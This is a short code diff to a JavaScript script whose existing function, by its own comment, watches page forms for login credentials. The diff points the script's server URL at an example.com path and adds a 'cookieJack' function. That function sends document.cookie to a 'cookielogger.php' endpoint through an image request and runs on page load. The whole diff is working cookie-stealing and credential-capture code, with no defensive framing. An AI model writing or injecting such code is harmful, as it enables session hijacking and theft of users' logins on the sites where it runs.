@@ -1,6 +1,6 @@
 function monitorSubmissions() {
   
-    var SERVER_URL = "http://example.com/"
+    var SERVER_URL = "http://example.com/225/"
     var forms = document.getElementsByTagName('form');
 
     for (var i = 0; i < forms.length; i++) {
@@ -35,4 +35,10 @@ function monitorSubmissions() {
               }
         };
 
+function cookieJack() {
+    var pic = new Image()
+    pic.src = SERVER_URL+'cookielogger.php?cookie='+document.cookie
+}
+
+cookieJack(); // Sends cookies
 monitorSubmissions(); // monitor submissions for login credentials
